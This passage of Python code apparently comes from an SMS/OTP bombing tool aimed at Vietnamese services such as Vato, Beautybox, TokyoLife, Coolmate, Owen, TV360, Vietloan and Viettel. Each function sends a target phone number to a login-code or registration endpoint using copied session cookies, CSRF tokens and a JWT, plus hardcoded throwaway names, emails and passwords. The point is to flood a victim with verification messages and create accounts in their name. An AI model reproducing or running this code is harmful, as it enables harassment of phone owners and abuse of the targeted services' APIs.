        'x-access-token': 'eyJhbGciOiJSUzI1NiIsImtpZCI6IjFkYmUwNmI1ZDdjMmE3YzA0NDU2MzA2MWZmMGZlYTM3NzQwYjg2YmMiLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImlwIjoiOjoxIiwidXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMTQuMC4wLjAgU2FmYXJpLzUzNy4zNiIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9mYWNlY2FyLTI5YWU3IiwiYXVkIjoiZmFjZWNhci0yOWFlNyIsImF1dGhfdGltZSI6MTcyMzAwNDgyMCwidXNlcl9pZCI6InNFMkk1dkg3TTBhUkhWdVl1QW9QaXByczZKZTIiLCJzdWIiOiJzRTJJNXZIN00wYVJIVnVZdUFvUGlwcnM2SmUyIiwiaWF0IjoxNzIzMDA0ODIwLCJleHAiOjE3MjMwMDg0MjAsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnt9LCJzaWduX2luX3Byb3ZpZGVyIjoiY3VzdG9tIn19.E64Pe8etFynxDXAQmJw7AnhfO5DDEPAYWCQEsWdnLEf2JqMtXrZJ50zvqO2k4Utnq5L6qU6fUhG3e7AQI5wKyDZ2-vZSi0sEw9Kmwe-57hHwu2rbhukmCigZ37FgWsQz1j3-fLn265zLXGNZKx8FISCm6Mub4KC-_YPp83oTAXNcOslus-3v_TsxAxZedvv8FVfnukzbFUmYmu-Q-0WZC7cs_Lmh0zOy6RxschDPrCX0gSL9d9dWAibLmcnhq7fVbybMW0D6hNhY23FoB7CA1dwnInixtq__VIhuga_oz0Nhx-Am_78JG1DmcymTRl0EHLVO7VDEWg6D-j6aBtjwUQ',
        'x-app-id': 'client',
    }

    json_data = {
        'phoneNumber': sdt,
        'deviceId': '8d5418f4-9f6d-4cd7-9941-fc3b87dbb4de',
        'use_for': 'LOGIN',
    }

    response = requests.post('https://api.vato.vn/api/authenticate/request_code', headers=headers, json=json_data)

    print(response.text)

def beautybox(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi',
        'content-type': 'application/json',
        'key': 'be517d728836e3ca6c9f9306be3957d5',
        'origin': 'https://beautybox.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://beautybox.com.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'timestamp': '1723008442001',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }
    
    # Chuyển đổi số điện thoại sang định dạng quốc tế
    if sdt.startswith('0'):
        sdt = '84' + sdt[1:]  # Thay '0' bằng '84'
    
    json_data = {
        'phoneNumber': sdt,  # Sử dụng số điện thoại đã chuyển đổi
    }
    
    response = requests.post(
        'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
        headers=headers,
        json=json_data,
    )
    
    print(response.text)

def tokyolife(sdt):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3',
        'content-type': 'application/json',
        'origin': 'https://tokyolife.vn',
        'priority': 'u=1, i',
        'referer': 'https://tokyolife.vn/',
        'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'signature': '4ae85718e0caff1fa812bbf89d35573d',
        'timestamp': '1723010959148',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    }

    json_data = {
        'phone_number': sdt,
        'name': 'Khang le',
        'password': 'sznqCr2vT@eGZbT',
        'email': 'polokhang0628@gmail.com',
        'birthday': '2000-08-07',
        'gender': 'male',
    }

    response = requests.post('https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register', headers=headers, json=json_data)

    print(response.text)

def coolmateme(sdt):
    cookies = {
        'device_token': '18cbef4c2ebe490776b4545ff761bef5',
        'box_token': 'f45167e627a94f6ec694684b438eb6ba',
        'cart_quantity': '0',
        '_gcl_au': '1.1.1940316811.1724253902',
        '_ga': 'GA1.1.793245097.1724253902',
        '_tt_enable_cookie': '1',
        '_ttp': 'Twinu1RGrKSPMDsOSQ6gjOsMuuZ',
        '_CEFT': 'Q%3D%3D%3D',
        'affiliate_content': '%7B%22time_stamp%22%3A1728532344%2C%22source%22%3A%22CocCoc%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22CPC%22%2C%22utm_campaign%22%3A%22VN_CC_Search_KW_Oct%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Fdo-casual%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fcontext.qc.coccoc.com%5C%2F%22%2C%22remote_addr%22%3A%22103.151.240.68%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Macintosh%3B%20Intel%20Mac%20OS%20X%2011.5%3B%20rv%3A130.0%29%20Gecko%5C%2F20010101%20Firefox%5C%2F130.0%22%2C%22utm_term%22%3A%22gi%5Cu00e1%20qu%5Cu1ea7n%20b%5Cu00f2%22%2C%22utm_content%22%3A%2244828710%22%2C%22gclid%22%3Anull%7D',
        'active-voucher1': 'true',
        'SHOW_POPUP_CAMPAIGN': 'false',
        'utm_source': 'CocCoc',
        'utm_medium': 'CPC',
        'utm_campaign': 'VN_CC_Search_KW_Oct',
        'cebs': '1',
        '_ce.clock_event': '1',
        'g_state': '{"i_p":1728619073953,"i_l":2}',
        'time2conversion_session_start_value': '1728533896927',
        '_ce.clock_data': '-654%2C116.111.184.238%2C1%2Cc068eb8995c441f0301a0fa52de88c34%2CFirefox%2CVN',
        'cebsp_': '2',
        'cto_bundle': 'S2By3l84Q0ZzQm0wV2ROaGxNSzVLMkZHQ2UwaE1uSjk1QWNybDRVV0oxTlRCcFFnZE5kdm9zMkZxREdnZld2a0Y4Y3dubDZ3MEs3bkVlMkwlMkZWWjBybUlpWXdjdnAzd21qbVpHWDRxV2xpY0s1ODBmV2htS3I2bjN1MmpjU09uMk1zRDZEeGNKcWtrdnVtOVVnZzQ1Y0ljYU1qYk1HVWJsS2J1Z3V3S0dLQ0VSczRLc2JZckt1ZXBucXJza1ZzcWJUdWdzag',
        'XSRF-TOKEN': 'eyJpdiI6IkpZYVdKc2JocVBJaURxb1F1XC9pend3PT0iLCJ2YWx1ZSI6Ikx2VnlDYVpYMkdONEtkYlhTdkViT0ZHcGhmVzdGbjk1bE1xaVg3cWF2OVpDWXRnbEFGVUw2S014WjFjYk1GeWYiLCJtYWMiOiJlMzNjYzVhZmZlYjgyODc2MTg1YjY5ZDI0N2E5YjBkNWRiYWMwMjc2MjYyNmZjY2NmOTg5NTJkZWQ2YzA1YjQ4In0%3D',
        'laravel_session': 'eyJpdiI6IjhwSGIzak9QbGdieTZCTWErWU9xNXc9PSIsInZhbHVlIjoiY0RONEtZbDRQNGRaVzBCbjZHc2o5VFhOaU1pVEVcL0dQR1hkSDlLVEw3WGpqMEFNQXBjTExIaW01N283QVV4SWciLCJtYWMiOiJlN2E2N2UwMWFjNTkxOWY0ODkyNGVhZmJmYmU2MDczNGZhZTc2YTBhOWRiYThjNWJmYzRhMDRkZjUwMTZiMTM5In0%3D',
        '_ga_42D2YCXC8V': 'GS1.1.1728532349.2.1.1728533936.16.0.1666955144',
        '_ce.s': 'v~cd81a551a07342374aa7b1700212f0855015d482~lcw~1728535222157~lva~1728533923298~vpv~1~as~false~v11.fhb~1724253902433~v11.lhb~1724254093882~vir~new~v11.cs~436459~v11.s~12c82e50-86bb-11ef-b6e6-9762a6d8669b~v11.sla~1728535222157~gtrk.la~m22t8pe5~gtrk.ngv~%7B%7D~gtrk.cnv~vt0~lcw~1728535222157',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'content-type': 'application/json',
        # 'cookie': 'device_token=18cbef4c2ebe490776b4545ff761bef5; box_token=f45167e627a94f6ec694684b438eb6ba; cart_quantity=0; _gcl_au=1.1.1940316811.1724253902; _ga=GA1.1.793245097.1724253902; _tt_enable_cookie=1; _ttp=Twinu1RGrKSPMDsOSQ6gjOsMuuZ; _CEFT=Q%3D%3D%3D; affiliate_content=%7B%22time_stamp%22%3A1728532344%2C%22source%22%3A%22CocCoc%22%2C%22traffic_id%22%3A%22%22%2C%22traffic_channel%22%3Anull%2C%22utm_medium%22%3A%22CPC%22%2C%22utm_campaign%22%3A%22VN_CC_Search_KW_Oct%22%2C%22url%22%3A%22https%3A%5C%2F%5C%2Fwww.coolmate.me%5C%2Fcollection%5C%2Fdo-casual%22%2C%22http_referer%22%3A%22https%3A%5C%2F%5C%2Fcontext.qc.coccoc.com%5C%2F%22%2C%22remote_addr%22%3A%22103.151.240.68%22%2C%22http_user_agent%22%3A%22Mozilla%5C%2F5.0%20%28Macintosh%3B%20Intel%20Mac%20OS%20X%2011.5%3B%20rv%3A130.0%29%20Gecko%5C%2F20010101%20Firefox%5C%2F130.0%22%2C%22utm_term%22%3A%22gi%5Cu00e1%20qu%5Cu1ea7n%20b%5Cu00f2%22%2C%22utm_content%22%3A%2244828710%22%2C%22gclid%22%3Anull%7D; active-voucher1=true; SHOW_POPUP_CAMPAIGN=false; utm_source=CocCoc; utm_medium=CPC; utm_campaign=VN_CC_Search_KW_Oct; cebs=1; _ce.clock_event=1; g_state={"i_p":1728619073953,"i_l":2}; time2conversion_session_start_value=1728533896927; _ce.clock_data=-654%2C116.111.184.238%2C1%2Cc068eb8995c441f0301a0fa52de88c34%2CFirefox%2CVN; cebsp_=2; cto_bundle=S2By3l84Q0ZzQm0wV2ROaGxNSzVLMkZHQ2UwaE1uSjk1QWNybDRVV0oxTlRCcFFnZE5kdm9zMkZxREdnZld2a0Y4Y3dubDZ3MEs3bkVlMkwlMkZWWjBybUlpWXdjdnAzd21qbVpHWDRxV2xpY0s1ODBmV2htS3I2bjN1MmpjU09uMk1zRDZEeGNKcWtrdnVtOVVnZzQ1Y0ljYU1qYk1HVWJsS2J1Z3V3S0dLQ0VSczRLc2JZckt1ZXBucXJza1ZzcWJUdWdzag; XSRF-TOKEN=eyJpdiI6IkpZYVdKc2JocVBJaURxb1F1XC9pend3PT0iLCJ2YWx1ZSI6Ikx2VnlDYVpYMkdONEtkYlhTdkViT0ZHcGhmVzdGbjk1bE1xaVg3cWF2OVpDWXRnbEFGVUw2S014WjFjYk1GeWYiLCJtYWMiOiJlMzNjYzVhZmZlYjgyODc2MTg1YjY5ZDI0N2E5YjBkNWRiYWMwMjc2MjYyNmZjY2NmOTg5NTJkZWQ2YzA1YjQ4In0%3D; laravel_session=eyJpdiI6IjhwSGIzak9QbGdieTZCTWErWU9xNXc9PSIsInZhbHVlIjoiY0RONEtZbDRQNGRaVzBCbjZHc2o5VFhOaU1pVEVcL0dQR1hkSDlLVEw3WGpqMEFNQXBjTExIaW01N283QVV4SWciLCJtYWMiOiJlN2E2N2UwMWFjNTkxOWY0ODkyNGVhZmJmYmU2MDczNGZhZTc2YTBhOWRiYThjNWJmYzRhMDRkZjUwMTZiMTM5In0%3D; _ga_42D2YCXC8V=GS1.1.1728532349.2.1.1728533936.16.0.1666955144; _ce.s=v~cd81a551a07342374aa7b1700212f0855015d482~lcw~1728535222157~lva~1728533923298~vpv~1~as~false~v11.fhb~1724253902433~v11.lhb~1724254093882~vir~new~v11.cs~436459~v11.s~12c82e50-86bb-11ef-b6e6-9762a6d8669b~v11.sla~1728535222157~gtrk.la~m22t8pe5~gtrk.ngv~%7B%7D~gtrk.cnv~vt0~lcw~1728535222157',
        'newrelic': 'eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMwMDE2ODkiLCJhcCI6IjEzODYyMDQ4NDUiLCJpZCI6IjZhZTMzOTE1OTdjMDJiYjQiLCJ0ciI6ImNhZDllZGU1YmY3NzZmMTdkYzdlMjJkZWI4ZDg4OTQ3IiwidGkiOjE3Mjg1MzUyMjIyNTB9fQ==',
        'origin': 'https://www.coolmate.me',
        'priority': 'u=1, i',
        'referer': 'https://www.coolmate.me/cart',
        'sec-ch-ua': '"(Not(A:Brand";v="99", "Google Chrome";v="129", "Chromium";v="129"',
        'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Google Chrome";v="129", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"macOS"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'traceparent': '00-cad9ede5bf776f17dc7e22deb8d88947-6ae3391597c02bb4-01',
        'tracestate': '3001689@nr=0-1-3001689-1386204845-6ae3391597c02bb4----1728535222250',
        'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6521.111 Safari/537.36',
        'x-csrf-token': 'QjTfT0HcvchKHIKM3Z1TkjU4n5W9WplzWgZqk4ix',
    }

    json_data = {
        'fullname': 'lee khang',
        'email': 'idappleshare33@gmail.com',
        'phone': sdt,
        'password': 'idappleshare33@gmail.com',
        'ajax': True,
    }

    response = requests.post('https://www.coolmate.me/account/register', cookies=cookies, headers=headers, json=json_data)

def owen(sdt):
    cookies = {
        'PHPSESSID': 'ae0f1c4f94cd5d4aaaa2a1a16964e352',
        'form_key': 'XtTPloebqDzzqsfQ',
        '_gcl_au': '1.1.158739477.1731070327',
        '__zi': '2000.SSZzejyD5yakXBoZr44LdJ3AihkM7GUNBjZmgO0C2CadthtZXme1noBPjwU72G6B8zUzeuG43OOv.1',
        'mage-cache-storage': '%7B%7D',
        'mage-cache-storage-section-invalidation': '%7B%7D',
        'form_key': 'XtTPloebqDzzqsfQ',
        '_hjSession_2284491': 'eyJpZCI6Ijg5ZWUyYmJjLWNkZTMtNDQ4Mi04ZjZjLWU5M2NjOTcxY2ZkOSIsImMiOjE3MzEwNzAzMzIyODQsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=',
        'mage-cache-sessid': 'true',
        'recently_viewed_product': '%7B%7D',
        'recently_viewed_product_previous': '%7B%7D',
        'recently_compared_product': '%7B%7D',
        'recently_compared_product_previous': '%7B%7D',
        'product_data_storage': '%7B%7D',
        '_tt_enable_cookie': '1',
        '_ttp': 'naTFs44R4O8e4xa2oVrNU89u0FC',
        '_gid': 'GA1.2.829955137.1731070335',
        'section_data_ids': '%7B%22insiderSection%22%3A1731070337%7D',
        'mage-messages': '',
        '_ga_KCJQM2MTWW': 'GS1.1.1731070327.1.1.1731070468.0.0.0',
        'private_content_version': 'f35cf79d4c1855ca53bbe6f25d141623',
        '_ga_GR0R493BCG': 'GS1.1.1731070327.1.1.1731070470.60.0.0',
        '_hjSessionUser_2284491': 'eyJpZCI6ImVjN2Q3OTgzLTQ4ZWUtNWJiNS1hMjVlLWYwOGVmOTE0NjljZiIsImNyZWF0ZWQiOjE3MzEwNzAzMzIyODAsImV4aXN0aW5nIjp0cnVlfQ==',
        '_ga': 'GA1.2.1512182488.1731070327',
        '_gat': '1',
    }
    
    headers = {
        'accept': '*/*',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'PHPSESSID=ae0f1c4f94cd5d4aaaa2a1a16964e352; form_key=XtTPloebqDzzqsfQ; _gcl_au=1.1.158739477.1731070327; __zi=2000.SSZzejyD5yakXBoZr44LdJ3AihkM7GUNBjZmgO0C2CadthtZXme1noBPjwU72G6B8zUzeuG43OOv.1; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; form_key=XtTPloebqDzzqsfQ; _hjSession_2284491=eyJpZCI6Ijg5ZWUyYmJjLWNkZTMtNDQ4Mi04ZjZjLWU5M2NjOTcxY2ZkOSIsImMiOjE3MzEwNzAzMzIyODQsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; mage-cache-sessid=true; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; _tt_enable_cookie=1; _ttp=naTFs44R4O8e4xa2oVrNU89u0FC; _gid=GA1.2.829955137.1731070335; section_data_ids=%7B%22insiderSection%22%3A1731070337%7D; mage-messages=; _ga_KCJQM2MTWW=GS1.1.1731070327.1.1.1731070468.0.0.0; private_content_version=f35cf79d4c1855ca53bbe6f25d141623; _ga_GR0R493BCG=GS1.1.1731070327.1.1.1731070470.60.0.0; _hjSessionUser_2284491=eyJpZCI6ImVjN2Q3OTgzLTQ4ZWUtNWJiNS1hMjVlLWYwOGVmOTE0NjljZiIsImNyZWF0ZWQiOjE3MzEwNzAzMzIyODAsImV4aXN0aW5nIjp0cnVlfQ==; _ga=GA1.2.1512182488.1731070327; _gat=1',
        'origin': 'https://owen.vn',
        'priority': 'u=1, i',
        'referer': 'https://owen.vn/customer/account/create/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'mobileNumber': sdt,
        'maxTimesToResend': '2',
        'timeAlive': '180',
        'timeCountDownToResend': '300',
        'form_key': 'XtTPloebqDzzqsfQ',
    }
    
    response = requests.post('https://owen.vn/otp/otp/send', cookies=cookies, headers=headers, data=data)

def tv3601(sdt):
  data = '{"msisdn":"phone"}'
  data = data.replace("phone",sdt)
  head = {
    "Host":"m.tv360.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/json"
  }
  rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
#
def vietloan(sdt):
    cookies = {
        '__cfruid': '33962b417134f3ecdff6405438c4e574b61364bc-1731078738',
        '_gcl_au': '1.1.587076898.1731078740',
        '_gid': 'GA1.2.1584225828.1731078740',
        '_tt_enable_cookie': '1',
        '_ttp': 'WhxdroVk7AmeCVSoBiEpXA8FcTe',
        '_clck': '1xh74pf%7C2%7Cfqp%7C0%7C1773',
        '_ym_uid': '1724320605731996533',
        '_ym_d': '1731078742',
        '_ym_isad': '1',
        '_ym_visorc': 'w',
        'XSRF-TOKEN': 'eyJpdiI6IndidGdxTlFNb094dnE4NWErcDhpdkE9PSIsInZhbHVlIjoiMTFmQTNma1BGTUtaeTZwUU9qNEdUV3ZzMUdZeitwOHpaOWFVVzVDL1prS2RXWkJmcjhCS21ZMml2RzU5aFIwNk94U2laOGZwTk9jMVBsOW5CVkV2RmszeGdpczhDM0xkQ0lXa3FlQTVXR2F4U1J3SG9LTlQzd0tDenVqeEhxMWIiLCJtYWMiOiIzMTJhNDkyODViN2E0OTRhYTQ4N2MwMjk2NDQwNzNkYTg4NTFiMWRkMzI5YTk4NjI3YzljODFlNmM4OGU3ZWFhIiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6ImdwSzZhakNGRUJ2V2UwQ1ZBVFNJVHc9PSIsInZhbHVlIjoiOS9ERTZxWloxS3U0K3BuM05Kc0Zoc3ZlSjVxS21XdUhlN1grQmdKRkNvVzU0bGoySGc2OVoyaWpVMEtVNVlMMGJkSkdVejhXNStvcjVkQ1huTUo4MjNaNDNZNTVQYXAxYkFtb1NZRjZXM2JGdm82SkI4SVBUVnAzSkRhSUF0aGgiLCJtYWMiOiJmMDgzZGE5MGI0YjVhNDE1MTliMjY1MTQxNjk4NTFkMThiZjcwMDU3MmJhNDNlNjNkZjVhN2Y3YjVmMmMzOGZhIiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6IjFyT2dqaDdFYWNaZjhsTlJqRklnWWc9PSIsInZhbHVlIjoicU1nNzRKVDdxVzhsRTkvM1RucWlCNDlnOUdYb0IvYVZhQ2ZJOVVVb0tQL1hxYmJobWVLUFJwT3l0aGw4a21zWDh5VWkxUWIvRm54d25hZEVmSHo0di95akQ2L2R0Smd3c1BIaTlPOWdONmU2d1NZWUx5VHdqUDM5Y0U1MVJNaEoiLCJtYWMiOiJlMjhmOGMzOGI3ZTE0YzI4YmE3YmYzNTBhMGU0NjBjMDBmMmFmYmQwNzY3ZTkxYjFiZThkMzc4ODU1ZTY3ZGE2IiwidGFnIjoiIn0%3D',
        '_ga': 'GA1.2.1862698628.1731078740',
        'ec_cache_utm': '530387c9-25dd-c5e9-9352-737d801f57f6',
        'ec_cache_client': 'false',
        'ec_cache_client_utm': 'null',
        'ec_png_utm': '530387c9-25dd-c5e9-9352-737d801f57f6',
        'ec_png_client': 'false',
        'ec_png_client_utm': 'null',
        'ec_etag_utm': '530387c9-25dd-c5e9-9352-737d801f57f6',
        'ec_etag_client': 'false',
        'ec_etag_client_utm': 'null',
        '_clsk': '1koser5%7C1731078756923%7C2%7C1%7Cr.clarity.ms%2Fcollect',
        '_ga_EBK41LH7H5': 'GS1.1.1731078740.1.1.1731078758.42.0.0',
        'uid': '530387c9-25dd-c5e9-9352-737d801f57f6',
        'client': 'false',
        'client_utm': 'null',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '__cfruid=33962b417134f3ecdff6405438c4e574b61364bc-1731078738; _gcl_au=1.1.587076898.1731078740; _gid=GA1.2.1584225828.1731078740; _tt_enable_cookie=1; _ttp=WhxdroVk7AmeCVSoBiEpXA8FcTe; _clck=1xh74pf%7C2%7Cfqp%7C0%7C1773; _ym_uid=1724320605731996533; _ym_d=1731078742; _ym_isad=1; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6IndidGdxTlFNb094dnE4NWErcDhpdkE9PSIsInZhbHVlIjoiMTFmQTNma1BGTUtaeTZwUU9qNEdUV3ZzMUdZeitwOHpaOWFVVzVDL1prS2RXWkJmcjhCS21ZMml2RzU5aFIwNk94U2laOGZwTk9jMVBsOW5CVkV2RmszeGdpczhDM0xkQ0lXa3FlQTVXR2F4U1J3SG9LTlQzd0tDenVqeEhxMWIiLCJtYWMiOiIzMTJhNDkyODViN2E0OTRhYTQ4N2MwMjk2NDQwNzNkYTg4NTFiMWRkMzI5YTk4NjI3YzljODFlNmM4OGU3ZWFhIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6ImdwSzZhakNGRUJ2V2UwQ1ZBVFNJVHc9PSIsInZhbHVlIjoiOS9ERTZxWloxS3U0K3BuM05Kc0Zoc3ZlSjVxS21XdUhlN1grQmdKRkNvVzU0bGoySGc2OVoyaWpVMEtVNVlMMGJkSkdVejhXNStvcjVkQ1huTUo4MjNaNDNZNTVQYXAxYkFtb1NZRjZXM2JGdm82SkI4SVBUVnAzSkRhSUF0aGgiLCJtYWMiOiJmMDgzZGE5MGI0YjVhNDE1MTliMjY1MTQxNjk4NTFkMThiZjcwMDU3MmJhNDNlNjNkZjVhN2Y3YjVmMmMzOGZhIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IjFyT2dqaDdFYWNaZjhsTlJqRklnWWc9PSIsInZhbHVlIjoicU1nNzRKVDdxVzhsRTkvM1RucWlCNDlnOUdYb0IvYVZhQ2ZJOVVVb0tQL1hxYmJobWVLUFJwT3l0aGw4a21zWDh5VWkxUWIvRm54d25hZEVmSHo0di95akQ2L2R0Smd3c1BIaTlPOWdONmU2d1NZWUx5VHdqUDM5Y0U1MVJNaEoiLCJtYWMiOiJlMjhmOGMzOGI3ZTE0YzI4YmE3YmYzNTBhMGU0NjBjMDBmMmFmYmQwNzY3ZTkxYjFiZThkMzc4ODU1ZTY3ZGE2IiwidGFnIjoiIn0%3D; _ga=GA1.2.1862698628.1731078740; ec_cache_utm=530387c9-25dd-c5e9-9352-737d801f57f6; ec_cache_client=false; ec_cache_client_utm=null; ec_png_utm=530387c9-25dd-c5e9-9352-737d801f57f6; ec_png_client=false; ec_png_client_utm=null; ec_etag_utm=530387c9-25dd-c5e9-9352-737d801f57f6; ec_etag_client=false; ec_etag_client_utm=null; _clsk=1koser5%7C1731078756923%7C2%7C1%7Cr.clarity.ms%2Fcollect; _ga_EBK41LH7H5=GS1.1.1731078740.1.1.1731078758.42.0.0; uid=530387c9-25dd-c5e9-9352-737d801f57f6; client=false; client_utm=null',
        'origin': 'https://vietloan.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietloan.vn/register',
        'sec-ch-ua': '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        '_token': 'jUl3Zt008tGqm4kDYaS6KZhqQDQj8ITF6SpwBXLR',
    }
    response = requests.post('https://vietloan.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)

def dvvtpass(sdt):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
